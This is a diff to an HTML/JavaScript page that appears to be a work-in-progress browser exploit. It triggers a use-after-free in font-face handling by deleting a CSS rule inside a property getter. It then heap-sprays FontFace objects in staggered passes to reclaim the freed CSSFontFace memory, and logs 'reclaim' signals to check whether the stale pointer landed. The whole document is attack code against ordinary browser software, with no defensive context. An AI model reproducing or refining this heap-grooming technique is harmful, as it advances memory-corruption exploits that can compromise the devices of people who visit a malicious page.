@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>P2 v15</title>
+<title>P2 v16</title>
 <style>body{font-size:28px;font-family:sans-serif;background:#111;color:#0f0}pre{white-space:pre-wrap;font-size:22px}</style>
 <style id="s0">@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }</style>
 </head>
@@ -10,45 +10,56 @@
 <h3 id="st">stage A</h3>
 <pre id="out"></pre>
 <script>
-// Phase 2 v15: SAME-CLASS spray. Fresh FontFace objects allocate the exact
-// CSSFontFace C++ class from the same allocator as the freed chunk. Oracle is
-// behavioral: stale engine pointers landing on a controlled face show up as
-// anomalous face statuses / the hung load resolving or corrupting.
+// Phase 2 v16: STAGGERED spray. Hypothesis: the CSSFontFace free is DEFERRED
+// past our getter-time spray on 14.23 (all previous sprays ran BEFORE the free).
+// Spray at 0/50/100/250/500/1000ms so one pass lands after the real free;
+// then .load() every sprayed face to drive the state machinery.
 function log(s) { document.getElementById('out').textContent += s + "\n"; }
 
-log('PAGE VERSION: v15 (same-class FontFace spray)');
+log('PAGE VERSION: v16 (staggered same-class spray)');
 log('UA = ' + navigator.userAgent);
 
-var NFS = 150, faces = [];
+var faces = [];
+var NF = 60;                       // faces per staggered pass
 
-function faceSpray() {
-  for (var i = 0; i < NFS; i++) {
-    var f = new FontFace('z' + i, 'local(Helvetica)', {});
-    document.fonts.add(f);            // allocates the backing CSSFontFace
+function facePass(pass) {
+  for (var i = 0; i < NF; i++) {
+    var f = new FontFace('p' + pass + 'x' + i, 'local(Helvetica)', {});
+    document.fonts.add(f);
     faces.push(f);
   }
+  log('spray pass ' + pass + ' at +' + (performance.now() | 0) + 'ms');
 }
 
 function scanFaces(tag) {
-  var bad = 0, loaded = 0, unloaded = 0, err = 0;
+  var weird = 0, loaded = 0, unloaded = 0, err = 0;
   try {
-    for (var i = 0; i < NFS; i++) {
+    for (var i = 0; i < faces.length; i++) {
       var s = faces[i].status;
       if (s === 'loaded') loaded++;
       else if (s === 'unloaded') unloaded++;
       else if (s === 'error') err++;
-      else { bad++; if (bad < 4) log('face ' + i + ' WEIRD status: ' + s); }
+      else { weird++; if (weird < 4) log('face ' + i + ' WEIRD: ' + s); }
     }
   } catch (e) { log('scan threw: ' + e); }
-  log('scan(' + tag + '): loaded=' + loaded + ' unloaded=' + unloaded +
-      ' error=' + err + ' weird=' + bad + ' fonts.status=' + document.fonts.status);
-  if (bad > 0) log('SAME-CLASS RECLAIM SIGNAL - anomalous face statuses');
+  log('scan(' + tag + '): n=' + faces.length + ' loaded=' + loaded +
+      ' unloaded=' + unloaded + ' error=' + err + ' weird=' + weird +
+      ' set=' + document.fonts.status);
+  if (weird) log('SAME-CLASS RECLAIM SIGNAL');
+}
+
+function driveLoads() {
+  var n = 0;
+  for (var i = 0; i < faces.length; i++) {
+    try { faces[i].load().then(null, null); n++; } catch (e) {}
+  }
+  log('drove .load() on ' + n + ' faces');
 }
 
 function trigger() {
   log('stage B: trigger in 3s');
   setTimeout(function () {
-    log('triggering + FontFace spray');
+    log('triggering');
 
     var A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
     document.fonts.add(A);
@@ -60,12 +71,10 @@ function trigger() {
       get: function () {
         fired++;
         if (this === A && fired === 1) {
-          log('GETTER FIRED - free + same-class spray');
+          log('GETTER FIRED - free at +' + (performance.now() | 0) + 'ms');
           try { document.getElementById('s0').sheet.deleteRule(0); } catch (e) {}
-          document.body.offsetTop;               // force recalc -> FREE
-          faceSpray();                           // 150 fresh CSSFontFace-class objects
-          document.body.offsetTop;               // recalc through the new faces
-          document.fonts.check('1em x', 'A');
+          document.body.offsetTop;
+          facePass(0);                          // getter-time spray
         }
         return undefined;
       }
@@ -74,16 +83,25 @@ function trigger() {
     try {
       document.fonts.load('1em x', 'AB').then(
         function (f) {
-          log('load RESOLVED with ' + (f ? f.length : '?') + ' faces' +
-              ' - stale pointer may have landed on a sprayed face');
-          for (var i = 0; f && i < f.length; i++)
-            log('  reported face: ' + (f[i] && f[i].family) +
+          log('load RESOLVED with ' + (f ? f.length : '?') + ' faces');
+          if (f) for (var i = 0; i < f.length; i++)
+            log('  face ' + i + ': ' + (f[i] && f[i].family) +
                 ' status=' + (f[i] && f[i].status));
         },
         function (e) { log('load rejected: ' + e); });
     } catch (e) { log('load threw: ' + e); }
 
-    setTimeout(function () { scanFaces('2s'); }, 2000);
+    // STAGGERED passes: whichever lands after the deferred free reclaims it
+    var delays = [50, 100, 250, 500, 1000], di = 0;
+    function nextPass() {
+      if (di >= delays.length) return;
+      facePass(delays[di] / 50);
+      di++;
+      setTimeout(nextPass, delays[di - 1] === 1000 ? 0 : delays[di] - delays[di - 1]);
+    }
+    setTimeout(nextPass, 50);
+
+    setTimeout(function () { driveLoads(); scanFaces('2s'); }, 2000);
     setTimeout(function () { scanFaces('6s'); }, 6000);
   }, 3000);
 }
